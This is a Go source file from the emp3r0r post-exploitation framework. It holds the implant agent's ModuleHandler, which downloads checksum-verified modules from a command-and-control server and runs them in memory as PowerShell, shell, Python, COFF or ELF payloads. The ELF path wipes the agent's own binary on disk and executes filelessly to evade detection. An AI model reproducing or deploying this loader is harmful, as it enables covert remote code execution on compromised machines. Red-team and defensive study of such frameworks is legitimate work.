package modules

import (
	"fmt"
	"os"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/arc/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/exeutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ModuleHandler downloads and runs modules from C2 using resolved, typed invocation data
func ModuleHandler(download_addr, file_to_download, payload_type, modName, checksum string, invocation def.ResolvedInvocation) (out string) {
	var err error

	// download and verify module file
	payload_data_downloaded, downloadErr := downloadAndVerifyModule(file_to_download, checksum, download_addr)
	if downloadErr != nil {
		return downloadErr.Error()
	}
	// in memory execution
	payload_data, err := arc.DecompressXz(payload_data_downloaded)
	if err != nil {
		return logging.Sprintf("decompressing %s: %v", file_to_download, err)
	}

	// switch on payload type, in memory execution
	switch payload_type {
	case "powershell":
		out, err := agentutils.ExecutePowerShell(payload_data, invocation.Argv, nil)
		if err != nil {
			return logging.Sprintf("running powershell script: %s (%v)", out, err)
		}
		return out
	case "bash":
		out, err := agentutils.ExecuteShell(payload_data, invocation.Argv, nil)
		if err != nil {
			return logging.Sprintf("running shell script: %s (%v)", out, err)
		}
		return out
	case "python":
		out, err := agentutils.ExecutePython(payload_data, invocation.Argv, nil)
		if err != nil {
			return logging.Sprintf("running python script: %s (%v)", out, err)
		}
		return out
	case "coff":
		out, err := runCOFFModule(payload_data, invocation)
		if err != nil {
			return logging.Sprintf("running COFF module: %v", err)
		}
		return out
	case "elf":
		outChan := make(chan string)
		go func() {
			err = util.FileAllocate(os.Args[0], 0)
			if err != nil {
				outChan <- logging.Sprintf("FileAllocate: %v", err)
				return
			}
			// if you need to pass arguments to the in-memory module, you can do it in environment variables
			// when implementing the module, you can read the arguments from env
			out, err = exeutil.InMemExeRun(payload_data, []string{os.Args[0]}, nil)
			if err != nil {
				out = logging.Sprintf("InMemExeRun: %v", err)
			}
			outChan <- logging.Sprintf("Success\n%s", out)
		}()
		select {
		case out = <-outChan:
			return out
		case <-time.After(10 * time.Second):
			out = "Timeout while waiting for in-memory module to print output"
			return out
		}
	default:
		return logging.Sprintf("unknown payload type %s or custom loader not available", payload_type)
	}
}

func downloadAndVerifyModule(file_to_download, checksum, download_addr string) (data []byte, err error) {
	if crypto.SHA256SumFile(file_to_download) != checksum {
		if data, err = c2transport.FetchFile(download_addr, file_to_download, "", checksum); err != nil {
			return nil, fmt.Errorf("downloading %s: %v", file_to_download, err)
		}
	} else {
		// checksum already matches local file; read it so callers can run in-memory flows
		if data, err = util.ReadFileAgent(file_to_download); err != nil {
			return nil, fmt.Errorf("reading %s: %v", file_to_download, err)
		}
	}

	if crypto.SHA256SumRaw(data) != checksum {
		logging.Print("Checksum failed, restarting...")
		util.TakeABlink()
		os.RemoveAll(file_to_download)
		return downloadAndVerifyModule(file_to_download, checksum, download_addr) // Recursive call
	}
	return data, nil
}
